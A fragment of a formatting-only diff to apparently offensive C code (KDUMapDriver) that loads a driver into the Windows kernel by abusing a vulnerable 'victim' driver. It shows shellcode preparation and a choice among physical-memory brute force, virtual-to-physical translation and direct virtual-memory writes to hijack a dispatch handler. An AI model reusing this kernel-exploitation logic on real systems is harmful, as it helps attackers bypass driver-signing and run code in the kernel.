+            if (VpQueryInformation(Context->Victim, VictimDriverInformation,
+                                   &vdi, sizeof(vdi))) {
                 targetAddress = vdi.LoadedImageBase + dispatchOffset;
 
-            }
-            else {
-                supShowWin32Error("[!] Cannot query victim driver layout", GetLastError());
+            } else {
+                supShowWin32Error("[!] Cannot query victim driver layout",
+                                  GetLastError());
                 break;
             }
 
-        }
-        else
-        {
-            supShowWin32Error("[!] Cannot query victim image information", GetLastError());
+        } else {
+            supShowWin32Error("[!] Cannot query victim image information",
+                              GetLastError());
             break;
         }
 
@@ -928,12 +823,8 @@ BOOL KDUMapDriver(
         //
         // Prepare shellcode, signal event and shared section.
         //
-        if (!KDUDriverMapInit(Context,
-            ImageBase,
-            &pvShellCode,
-            &sectionHandle,
-            &readyEventHandle))
-        {
+        if (!KDUDriverMapInit(Context, ImageBase, &pvShellCode, &sectionHandle,
+                              &readyEventHandle)) {
             break;
         }
 
@@ -943,59 +834,52 @@ BOOL KDUMapDriver(
         // Select proper handling depending on exploitable driver type.
         //
         if (Context->Provider->LoadData->PhysMemoryBruteForce) {
-
             //
             // 1. Physical memory mapping via MmMapIoSpace(Ex)
             //
             RtlSecureZeroMemory(&enumParams, sizeof(enumParams));
 
             enumParams.DeviceHandle = Context->DeviceHandle;
-            enumParams.ReadPhysicalMemory = Context->Provider->Callbacks.ReadPhysicalMemory;
-            enumParams.WritePhysicalMemory = Context->Provider->Callbacks.WritePhysicalMemory;
+            enumParams.ReadPhysicalMemory =
+                Context->Provider->Callbacks.ReadPhysicalMemory;
+            enumParams.WritePhysicalMemory =
+                Context->Provider->Callbacks.WritePhysicalMemory;
 
-            enumParams.DispatchSignature = Context->Victim->Data.DispatchSignature;
-            enumParams.DispatchSignatureLength = Context->Victim->Data.DispatchSignatureLength;
+            enumParams.DispatchSignature =
+                Context->Victim->Data.DispatchSignature;
+            enumParams.DispatchSignatureLength =
+                Context->Victim->Data.DispatchSignatureLength;
 
             enumParams.DispatchHandlerOffset = vi.DispatchOffset;
             enumParams.DispatchHandlerPageOffset = vi.DispatchPageOffset;
             enumParams.JmpAddress = vi.JumpValue;
 
-            bSuccess = KDUpMapDriverPhysicalBruteForce(Context,
-                pvShellCode,
-                cbShellCode,
-                sectionHandle,
-                readyEventHandle,
-                &enumParams);
+            bSuccess = KDUpMapDriverPhysicalBruteForce(
+                Context, pvShellCode, cbShellCode, sectionHandle,
+                readyEventHandle, &enumParams);
+        } else if (Context->Provider->LoadData->PML4FromLowStub ||
+                   Context->Provider->LoadData->PreferPhysical) {
+            //
+            // 2. Physical section access type driver with virt2phys translation
+            // available.
+            //
+            bSuccess = KDUpMapDriverPhysicalTranslate(
+                Context, pvShellCode, cbShellCode, sectionHandle,
+                readyEventHandle, &vi, targetAddress);
+
+        } else {
+            //
+            // 3. Direct VM write primitive available.
+            //
+            bSuccess = KDUpMapDriverDirectVM(Context, pvShellCode, cbShellCode,
+                                             sectionHandle, readyEventHandle,
+                                             targetAddress);
         }
-        else
-            if (Context->Provider->LoadData->PML4FromLowStub || Context->Provider->LoadData->PreferPhysical) {
-                //
-                // 2. Physical section access type driver with virt2phys translation available.
-                //
-                bSuccess = KDUpMapDriverPhysicalTranslate(Context,
-                    pvShellCode,
-                    cbShellCode,
-                    sectionHandle,
-                    readyEventHandle,
-                    &vi,
-                    targetAddress);
 
-            }
-            else {
-                //
-                // 3. Direct VM write primitive available.
-                //
-                bSuccess = KDUpMapDriverDirectVM(Context,
-                    pvShellCode,
-                    cbShellCode,
-                    sectionHandle,
-                    readyEventHandle,
-                    targetAddress);
-
-            }
-
-        if (readyEventHandle) CloseHandle(readyEventHandle);
-        if (sectionHandle) NtClose(sectionHandle);
+        if (readyEventHandle)
+            CloseHandle(readyEventHandle);
+        if (sectionHandle)
+            NtClose(sectionHandle);
 
     } while (FALSE);
 
@@ -1006,7 +890,7 @@ BOOL KDUMapDriver(
         printf_s("[+] Victim released\r\n");
     }
 
-    if (pvShellCode) 
+    if (pvShellCode)
         ScFree(pvShellCode, ScSizeOf(Context->ShellVersion, NULL));
 
     FUNCTION_LEAVE_MSG(__FUNCTION__);
